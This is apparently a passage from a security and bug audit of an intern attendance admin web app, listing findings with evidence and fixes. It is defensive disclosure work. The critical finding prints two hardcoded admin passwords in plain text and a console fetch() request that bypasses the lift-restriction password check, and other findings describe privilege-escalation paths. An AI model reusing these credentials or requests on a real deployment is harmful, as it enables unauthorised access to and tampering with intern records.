**What's wrong:** `fetchSessionStatus` catches every failure with only a `console.warn`; `sessionData` is left null. The derived state at line 139 is `const status = sessionData?.status || "Active"`, so a permanently failing poll renders as a healthy Active session. The polling interval is only cleared when a response says "Ended"/"Expired", so it keeps hitting the server every 2 s forever.

**Failure:** The backend is redeployed while a meeting QR is projected. `activeQrSessions` is an in-memory Map, so `GET /qrcode/session/<id>` now 404s. Interns keep scanning successfully (scanMeetingQRCode skips the session checks when the session is missing and the payload is under 1 h old), but the fullscreen board shows "Session Active — Auto-updating…", "Total Scans 0" and "Waiting for attendees to scan…" for the rest of the meeting, while the browser fires a request every 2 seconds indefinitely.

**Evidence:**
```
AdminQRManagement.jsx:94-98 `catch (error) { console.warn("Session polling error (backend may have restarted):", error.message); }`; :139 `const status = sessionData?.status || "Active";`; :116-135 the interval is only cleared on Ended/Expired or on `qrCodeData` becoming null. qrCodeController.js:18 `const activeQrSessions = new Map();` (process memory, no persistence).
```

**Fix:** Track consecutive failures in state; after N failures set an explicit "Unavailable" status, render a warning banner, and clear the interval. Persist QR sessions (Mongo/Redis) so a restart does not orphan a live session.

## [MEDIUM] Attendance limit is unvalidated: clearing the field silently disables the limit, a negative value ends the session instantly
`frontend/src/pages/AdminQRManagement.jsx:447` · *validation*

**What's wrong:** `onChange={(e) => setAttendanceLimit(Number(e.target.value))}` turns an empty input into `0`. `handleGenerate` then computes `limit = attendanceLimit` and `adminApi.generateQRCode` only appends the query parameter under `if (limit)`, so `0` is dropped and the backend stores `limit: null`. The `min="1"` attribute is not enforced on typed input and no form validation runs, so a negative number is sent verbatim.

**Failure:** An admin enables "Limit Attendance Count", selects the field and deletes the 10 intending to type 25, then clicks Generate before finishing. The toggle still reads ON but the session is created with no limit at all, the fullscreen board omits the "Remaining Slots" card, and unlimited interns can scan. If instead they type "-5", the backend stores `limit: -5`; the first status poll hits `attendees.length >= -5` and immediately sets `status: "Ended"`, so the freshly generated QR is dead and every scan returns "This QR session has been ended by the admin."

**Evidence:**
```
AdminQRManagement.jsx:443-449 the number input with `onChange={(e) => setAttendanceLimit(Number(e.target.value))}`; :32 `const limit = (activeTab === 'meeting' && limitAttendance) ? attendanceLimit : null;`; adminApi.js:389 `if (limit) { url += \`&limit=${limit}\`; }`; qrCodeController.js:157 `limit: limit ? parseInt(limit, 10) : null`; :260 `attendees.length >= session.limit`.
```

**Fix:** Clamp on change (`setAttendanceLimit(Math.max(1, Number(e.target.value) || 1))`) and block generation with a toast when `limitAttendance && (!Number.isInteger(attendanceLimit) || attendanceLimit < 1)`; also reject non-positive `limit` server-side in `generateQRCode`.

## [MEDIUM] "Copy Code" copies the sessionId, not the QR payload, and throws on non-HTTPS origins
`frontend/src/pages/AdminQRManagement.jsx:77` · *logic*

**What's wrong:** For meeting QRs the encoded content is a JSON payload (`{type:'meeting_attendance', projectName, meetingTitle, timestamp, sessionId}`), but the backend response's `sessionId` field holds only the extracted inner id string. `copyToClipboard` copies that id and reports "QR Code content copied to clipboard". Separately, `navigator.clipboard` is undefined on insecure origins and the call is neither awaited nor wrapped in try/catch.

**Failure:** An admin working remotely clicks "Copy Code" and pastes the value into the intern chat as a manual fallback. Interns entering it get "Invalid QR code format. Please scan a valid meeting attendance QR code." because `scanMeetingQRCode` does `JSON.parse(qrCode)` and then requires `qrPayload.type === 'meeting_attendance'`. On the LAN http:// deployment the same button throws `TypeError: Cannot read properties of undefined (reading 'writeText')`, nothing is copied and no toast appears — the button looks inert.

**Evidence:**
```
AdminQRManagement.jsx:77-81 `navigator.clipboard.writeText(qrCodeData.sessionId); toast.success('QR Code content copied to clipboard');`. qrCodeController.js:132-146 builds the JSON payload then reassigns `sessionId = JSON.stringify(meetingData)`; :151 `const extractedSessionId = type === 'daily' ? sessionId : JSON.parse(sessionId).sessionId;` and :163 returns only that id. qrCodeController.js:546-555 `qrPayload = JSON.parse(qrCode)` then `if (qrPayload.type !== "meeting_attendance")`.
```

**Fix:** Return the raw encoded payload from `generateQRCode` (e.g. `qrPayload: sessionId`) and copy that; wrap the call as `await navigator.clipboard?.writeText(...)` inside try/catch with a fallback `document.execCommand('copy')` textarea and an error toast.

# AdminPinManagement — 2 findings

## [HIGH] Countdown timer retries the PIN fetch every second forever when the request fails
`frontend/src/pages/AdminPinManagement.jsx:53` · *react-effect*

**What's wrong:** The 1-second interval calls `setPinCountdown(current => { if (current <= 1) { fetchFacePin(); return 0; } return current - 1; })`. When `fetchFacePin` rejects, its catch only fires a toast — `facePinData` stays truthy (so the interval keeps running) and `pinCountdown` stays 0. The next tick sees `current <= 1` again and re-fires the request. There is no in-flight guard and no backoff, so a single failure becomes a permanent 1 request/second loop. Invoking an async side effect from inside a `setState` updater is also impure: React StrictMode double-invokes updaters, firing two requests per rotation in development.

**Failure:** An admin leaves the PIN board open on a projector. The 24h admin JWT expires (authService.js:20). At the next rotation the GET returns 401/403, and from then on the page fires `GET /admin/face-attendance/meeting-pin` every second forever while stacking a new red "Failed to generate face attendance PIN" toast each second. The displayed PIN never updates but is still shown as current, so interns are told to enter a PIN the server no longer accepts.

**Evidence:**
```
AdminPinManagement.jsx:50-64 — the interval effect; :42-44 `catch (error) { toast.error(...); console.error(error); }` never clears `facePinData` or resets `pinCountdown`.
```

**Fix:** Move the refresh out of the updater: use the interval only to decrement, and a separate `useEffect(() => { if (pinCountdown === 0 && facePinData) fetchFacePin(); }, [pinCountdown])` guarded by an `isFetching` ref; on failure clear `facePinData` (or set a long backoff) so the loop stops.

## [MEDIUM] PIN and QR admin pages are not permission-gated, so a supervisor can mint face-attendance PINs
`frontend/src/routes/AppRoutes.jsx:178` · *authorization*

**What's wrong:** `AdminRoute` only checks that a token and a role exist (AdminRoute.jsx:7); it performs no per-route permission check. AdminNavigation hides the PIN and QR links behind `attendance.manage` (AdminNavigation.jsx:50-51), but the routes themselves are reachable by URL. On the backend, `routePermission()` maps any `/face-attendance*` GET to `attendance.view`, which supervisors do hold (adminPermissions.js:12-15). Unlike AdminUserManagement.jsx:73, neither page calls `hasAdminPermission`.

**Failure:** A supervisor (permissions: dashboard.view, interns.view, daily_logs.view, attendance.view, leave.view) types /admin/pin-management, enters any project name and clicks Generate. `GET /admin/face-attendance/meeting-pin` passes the `attendance.view` check and returns a live 6-digit PIN, letting a user who is explicitly denied attendance management authorise face-attendance marking. The same supervisor at /admin/qr-management can generate QR codes (that endpoint has no auth at all). The Stop button then 403s (`POST` maps to `attendance.manage`), so the page half-works.

**Evidence:**
```
AppRoutes.jsx:177-178 `<Route path="/admin/qr-management" element={<AdminQRManagement />} />` and `<Route path="/admin/pin-management" element={<AdminPinManagement />} />` inside `<Route element={<AdminRoute />}>`; AdminRoute.jsx:7 `if (!session?.token || !session?.user?.role)`; adminAuth.js:33-35 `if (path.startsWith("/face-attendance") ...) return req.method === "GET" ? "attendance.view" : "attendance.manage";`.
```

**Fix:** Add `if (!hasAdminPermission('attendance.manage')) return <Navigate to="/admin/dashboard" replace />;` to both pages (mirroring AdminUserManagement.jsx:73) and change adminAuth.js:33 so the meeting-pin routes require `attendance.manage` for GET as well.

# AdminUserManagement — 4 findings

## [HIGH] Removing a user's last permission grants them the full default role permission set instead of none
`backend/controllers/adminUserController.js:149` · *privilege-escalation*

**What's wrong:** `updateUser` finishes with `updates.permissions = permissionsForUser({ email, role, permissions: updates.permissions || user.permissions })`. `permissionsForUser(user, permissions)` takes the override as its SECOND argument, which is never passed here, so it falls into `user?.permissions?.length ? [...user.permissions] : permissionsForRole(user?.role)`. An empty array has `.length === 0` (falsy), so an intentional "no permissions" result is silently replaced by `permissionsForRole(role)` — `ALL_PERMISSIONS` for role `admin`. The same fallback exists in `requireAdmin` (adminAuth.js:15), so a stored empty array also resolves to full access at request time.

**Failure:** A super admin opens a compromised admin's row and unchecks every permission checkbox to lock them out. The final PATCH sends `{permissions: []}`; the controller returns the user with all 12 permissions and the UI immediately re-renders with every checkbox checked again. The target keeps dashboard, interns.manage, settings.manage and users.manage access. The same happens on any later `{isActive:...}`-only PATCH for a user whose stored permissions array is empty.

**Evidence:**
```
adminUserController.js:141 `updates.permissions = sanitizePermissions(...)` correctly yields `[]`; adminUserController.js:149-151 then calls `permissionsForUser({ ... permissions: updates.permissions || user.permissions })` with only one argument. adminPermissions.js:20-25 `permissionsForUser = (user, permissions) => { let resolved = Array.isArray(permissions) ? [...permissions] : user?.permissions?.length ? [...user.permissions] : permissionsForRole(user?.role); ...}`.
```

**Fix:** Pass the resolved list as the second argument — `permissionsForUser({ email: user.email, role: updates.role || user.role }, updates.permissions ?? user.permissions)` — and change the `.length` check in adminPermissions.js:23 to `Array.isArray(user?.permissions)` so an explicit empty array is honoured.

## [MEDIUM] Session expiry on the user list surfaces as a generic inline error with no redirect to login
`frontend/src/pages/AdminUserManagement.jsx:11` · *error-handling*

**What's wrong:** This page uses its own bare `request` helper rather than `adminApi`, so it skips `checkAuth`/`handleUnauthorized` (adminApi.js:4-20) entirely. A 401 is turned into `new Error(data.message || 'Request failed (401)')` and rendered in the red banner; the stale `adminInfo` stays in localStorage and the user is never sent to /admin-login.

**Failure:** An admin leaves the Users tab open past the 24-hour token lifetime (authService.js:20). Every action — Refresh, Invite user, role change, permission checkbox — shows "Session expired. Please log in again." or "Request failed (401)" in a banner while the page keeps rendering the previously loaded user list as if it were live. Nothing prompts a re-login, so the admin repeatedly retries mutations that can never succeed.

**Evidence:**
```
AdminUserManagement.jsx:11-23 `const request = async (path, options = {}) => { ... const data = await response.json().catch(() => ({})); if (!response.ok) throw new Error(data.message || \`Request failed (${response.status})\`); return data; };` — no status-specific handling. Compare adminApi.js:4-20 `checkAuth` which calls `handleUnauthorized(msg)`.
```

**Fix:** In `request`, call the shared `handleUnauthorized` from `../utils/sessionUtils` when `response.status === 401` (and treat 403 as a permission error, not a session error) before throwing.

## [MEDIUM] The User Management nav entry is commented out, leaving the page reachable only by typing the URL
`frontend/src/components/AdminNavigation.jsx:58` · *dead-ui*

**What's wrong:** Every admin page has an entry in `navLinks`, filtered by `hasAdminPermission(link.permission)`. The Users entry is present but commented out, so the filter never sees it. The route itself is live at AppRoutes.jsx:198 and the page correctly self-guards with `hasAdminPermission("users.manage")`.

**Failure:** A super admin needs to invite a new supervisor. There is no "Users" item in the sidebar on any screen size, and no other page links to /admin/users, so the entire access-control feature — invitations, role assignment, activate/deactivate, permission editing — is undiscoverable unless someone already knows the URL.

**Evidence:**
```
AdminNavigation.jsx:58 `//{ to: "/admin/users", label: "Users", icon: <Users className="h-[18px] w-[18px]" />, hoverColor: "#ffffff", permission: "users.manage" },`; :59 `].filter((link) => !link.permission || hasAdminPermission(link.permission));`. AppRoutes.jsx:198 `<Route path="/admin/users" element={<AdminUserManagement />} />`.
```

**Fix:** Uncomment line 58 — the existing `permission: "users.manage"` filter already hides it from supervisors, matching the page's own guard at AdminUserManagement.jsx:73.

## [LOW] `setUsers(data.users)` has no array fallback, unlike the adjacent availablePermissions line
`frontend/src/pages/AdminUserManagement.jsx:53` · *crash*

**What's wrong:** `load` does `setUsers(data.users)` while the very next line defensively writes `setAvailablePermissions(data.availablePermissions || [])`. `request` returns `{}` for any 2xx response whose body is not parseable JSON (line 20 `.catch(() => ({}))`), which makes `users` `undefined`. `filteredUsers` and `stats` then call `.filter(...)` on it during the same render.

**Failure:** A proxy or dev-server returns a 200 with an HTML body (a redirect interstitial, an SSO landing page) for `/admin/users`. `request` resolves with `{}`, `users` becomes `undefined`, and the `useMemo` at line 60 throws `TypeError: Cannot read properties of undefined (reading 'filter')`. Because the throw happens during render there is no error boundary path here — the whole admin app unmounts to a blank white screen instead of showing the error banner.

**Evidence:**
```
AdminUserManagement.jsx:20 `const data = await response.json().catch(() => ({}));`; :53-54 `setUsers(data.users); setAvailablePermissions(data.availablePermissions || []);`; :60 `const filteredUsers = useMemo(() => users.filter((user) => {...}), [users, search, statusFilter]);`.
```

**Fix:** Change line 53 to `setUsers(Array.isArray(data.users) ? data.users : [])`.

# LogbookRestrictions — 7 findings

## [CRITICAL] Lift-restriction "admin password" is a hardcoded client-side string check the backend never enforces
`frontend/src/pages/LogbookRestrictions.jsx:257` · *security*

**What's wrong:** The Lift Restriction flow prompts for an "Admin Password" and compares it in the browser against two literals baked into the bundle: `if (password !== 'TalentHub@2026' && password !== 'G2026@SLT@npm')`. The corresponding backend endpoint `POST /api/admin/logbook-restrictions/:id/lift` (logBookRestrictionController.liftRestriction) accepts only `{ liftReason, liftedBy }` and performs no password/step-up verification at all. The two secrets are readable by anyone who opens the production JS bundle or DevTools.

**Failure:** Any user who can load /admin/logbook-restrictions opens DevTools, reads the two literals from the bundle (or simply issues `fetch('/api/admin/logbook-restrictions/<id>/lift', {method:'POST', headers:{Authorization:'Bearer <any valid token>'}, body:JSON.stringify({liftReason:'x'.repeat(20)})})` from the console) and lifts any intern's logbook restriction without knowing any password. Conversely the two production passwords are now permanently disclosed to every visitor of the admin app.

**Evidence:**
```
LogbookRestrictions.jsx:257 `if (password !== 'TalentHub@2026' && password !== 'G2026@SLT@npm') { ... return; }` — the only gate. logBookRestrictionController.js:113-145 `liftRestriction` destructures only `{ liftReason, liftedBy = "Admin" }` and never checks a password or `req.user`.
```

**Fix:** Remove the hardcoded literals. If step-up auth is required, add a real backend re-authentication endpoint (verify the caller's credential/OTP server-side) and have `liftRestriction` reject requests without a valid step-up token.

## [HIGH] settings.manage is never enforced on logbook restrictions — supervisors can lift/restrict
`backend/routes/logBookRestrictionroutes.js:7` · *authorization*

**What's wrong:** CORRECTED BY MANUAL VERIFICATION. logBookRestrictionroutes.js:7 does apply only authMiddleware, but the original claim that any intern JWT works is REFUTED: app.js mounts adminRoutes at /api/admin (line 70) BEFORE this router (line 79), and adminRoutes' router.use(authMiddleware)/requireAdmin/enforceRoutePermission run for every path under the prefix even when no route matches, so an intern JWT is 403'd by requireAdmin first. The real defect is narrower: routePermission() in adminAuth.js:27-38 has no branch for /logbook-restrictions, so it falls through to the default "dashboard.view" — a permission every role holds. The nav gates this page on "settings.manage" (AdminNavigation.jsx:57), which supervisors lack, but the API never checks it.

**Failure:** A supervisor (dashboard.view, interns.view, daily_logs.view, attendance.view, leave.view — no settings.manage) cannot see the 'Log Restrictions' sidebar entry, but typing /admin/logbook-restrictions loads the page, and POST /api/admin/logbook-restrictions/:id/lift succeeds because enforceRoutePermission only demands dashboard.view. The supervisor lifts a logbook restriction they were never authorised to touch, and the audit trail records it as a legitimate admin action.

**Evidence:**
```
backend/app.js:70 app.use("/api/admin", adminRoutes) precedes :79 app.use("/api/admin/logbook-restrictions", logBookRestrictionRoutes). backend/routes/adminRoutes.js:89-91 router.use(authMiddleware); router.use(requireAdmin); router.use(enforceRoutePermission). backend/middleware/adminAuth.js:27-38 routePermission() has no /logbook-restrictions branch and ends `return "dashboard.view";`. frontend/src/components/AdminNavigation.jsx:57 permission: "settings.manage".
```

**Fix:** Add an explicit guard on the router itself: router.use(requireAdmin, requirePermission("settings.manage")) in logBookRestrictionroutes.js, and add a /logbook-restrictions branch to routePermission(). Do the same for /seat-bookings with seats.manage.

## [MEDIUM] Export PDF always exports every restricted intern, ignoring the active search filter
`frontend/src/pages/LogbookRestrictions.jsx:460` · *export*

**What's wrong:** `exportToPDF` iterates `interns` (the full fetched list) while the entire page — the table, the mobile cards and the "Shown (filtered)" stat — renders `filtered`. The button sits directly beside the "Shown (filtered)" counter, so the UI implies the export follows the filter.

**Failure:** An admin types a trainee ID into the search box; the stats bar reads "Currently Restricted 47 / Shown (filtered) 1" and the table shows that one intern. They click "Export PDF" to send that intern's record to a supervisor and instead get a 47-row PDF containing every restricted intern's name, ID and restriction reason — an accidental bulk PII disclosure by email.

**Evidence:**
```
LogbookRestrictions.jsx:460 `interns.forEach(intern => { ... tableRows.push(rowData); });` inside `exportToPDF`; :552-560 `const filtered = interns.filter(...)`; :622 `{loading ? "—" : filtered.length}` labelled "Shown (filtered)"; :629 `onClick={exportToPDF}`.
```

**Fix:** Change line 460 to `filtered.forEach(...)` and include the active search term in the PDF subtitle, or add an explicit "Export all / Export filtered" choice.

## [MEDIUM] Lift audit trail records the literal string "Admin" instead of the acting administrator
`frontend/src/pages/LogbookRestrictions.jsx:272` · *data-integrity*

**What's wrong:** `handleLift` posts `{ liftReason, liftedBy: "Admin" }` and `liftRestriction` writes that value straight into `logbookRestrictionHistory.$.liftedBy` (defaulting to the same literal when absent). `req.user`/`req.admin` — which carries the authenticated id and email — is never consulted, so every lift in the history is attributed to the same anonymous "Admin".

**Failure:** Three different admins lift restrictions over a month. When a dispute arises about who restored an intern's access, the Restriction History shows "By: Admin" for all three entries and there is no other record — the compliance audit trail is unusable. A caller can also spoof it outright by posting `{liftedBy:'Someone Else'}`.

**Evidence:**
```
LogbookRestrictions.jsx:272 `body: JSON.stringify({ liftReason: reason.trim(), liftedBy: "Admin" })`; logBookRestrictionController.js:116 `const { liftReason, liftedBy = "Admin" } = req.body;` and :140 `"logbookRestrictionHistory.$.liftedBy": liftedBy,`.
```

**Fix:** Drop `liftedBy` from the client payload and derive it server-side: `const liftedBy = req.admin?.name || req.admin?.email || req.user?.email;` (after adding `requireAdmin` per the routing finding), and store the admin's id alongside the display name.

## [LOW] Restriction History modal is fully implemented but unreachable — nothing ever sets historyTarget
`frontend/src/pages/LogbookRestrictions.jsx:430` · *dead-ui*

**What's wrong:** `historyTarget` state, the `HistoryModal` component (lines 88-184) and its render site (lines 895-900) all exist, and the backend returns `restrictionHistory` on every list row (`mapInternToResponse`, logBookRestrictionController.js:266) plus a dedicated `GET /:id/history` endpoint. But `setHistoryTarget` is never called: the desktop row action cell (line 815-823) and the mobile card action row (line 870-878) contain only the "Lift" button.

**Failure:** An admin about to lift a restriction wants to check whether this intern has been restricted before. There is no control anywhere on the page to open the history, so they lift blind — repeat offenders are indistinguishable from first-timers. The `FaHistory` icon and the whole modal ship in the bundle unused.

**Evidence:**
```
LogbookRestrictions.jsx:430 `const [historyTarget, setHistoryTarget] = useState(null);` — `setHistoryTarget` appears only here and at :898 `onClose={() => setHistoryTarget(null)}`. No `setHistoryTarget(intern)` call exists in the file.
```

**Fix:** Add a "History" button next to "Lift" in both the table action cell (~line 815) and the mobile card actions (~line 870) that calls `setHistoryTarget(intern)`.

## [LOW] cancelButtonColor is set from BRAND.ghost, which does not exist
`frontend/src/pages/LogbookRestrictions.jsx:218` · *correctness*

**What's wrong:** The `BRAND` object defines only `primary`, `accent`, `danger`, `success` and `warn` (lines 41-47). The SweetAlert config passes `cancelButtonColor: BRAND.ghost`, which evaluates to `undefined`.

**Failure:** When the password dialog opens during a lift, SweetAlert receives `cancelButtonColor: undefined` and falls back to its default (grey/red) styling rather than the intended ghost treatment, so the Cancel button renders off-brand next to the blue Verify button on an otherwise custom-styled modal.

**Evidence:**
```
LogbookRestrictions.jsx:41-47 `const BRAND = { primary: "#0056a2", accent: "#00b4eb", danger: "#ef4444", success: "#50b748", warn: "#f59e0b" };`; :218 `cancelButtonColor: BRAND.ghost,`.
```

**Fix:** Remove the `cancelButtonColor` line (the `logres-btn--ghost` customClass on line 224 already styles it) or add a `ghost` colour to the BRAND object.

## [LOW] Export filename uses a UTC date, producing yesterday's date before 05:30 local time
`frontend/src/pages/LogbookRestrictions.jsx:512` · *date-timezone*

**What's wrong:** `new Date().toISOString().split('T')[0]` formats the current instant in UTC. Sri Lanka is UTC+5:30, so between local midnight and 05:30 the UTC calendar date is still the previous day, while the report header on line 444 uses `toLocaleString()` (local time).

**Failure:** An admin exports the report at 01:00 on 5 August in Colombo. The PDF's own header reads "Generated on: 8/5/2026, 1:00:00 AM" but the file saves as `Logbook_Restrictions_2026-08-04.pdf`. Two exports taken hours apart on the same working day land in different date buckets, and sorting the archive folder by filename misorders them.

**Evidence:**
```
LogbookRestrictions.jsx:512-513 `const dateSuffix = new Date().toISOString().split('T')[0]; doc.save(\`Logbook_Restrictions_${dateSuffix}.pdf\`);` versus :444 `doc.text(\`Generated on: ${new Date().toLocaleString()}\`, 14, 30);`.
```

**Fix:** Build the suffix from local parts, e.g. `const d = new Date(); const dateSuffix = \`${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,'0')}-${String(d.getDate()).padStart(2,'0')}\`;`.
